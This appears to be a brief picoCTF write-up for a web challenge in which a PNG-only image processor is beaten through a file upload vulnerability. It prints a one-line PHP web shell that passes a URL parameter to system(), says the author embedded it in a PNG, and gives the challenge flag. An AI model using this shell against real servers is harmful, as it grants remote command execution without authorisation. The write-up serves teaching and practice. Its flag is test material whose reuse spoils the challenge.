# Description: #
Description
I found a web app that can help process images: PNG images only!

# Solution #
Based on the description, I knew that it would be a file upload vulnerability.

My payload:
```php
<?php system($_GET['cmd']); ?>
```
I inject it to a png file named [blue.png]() I downloaded online

Flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}
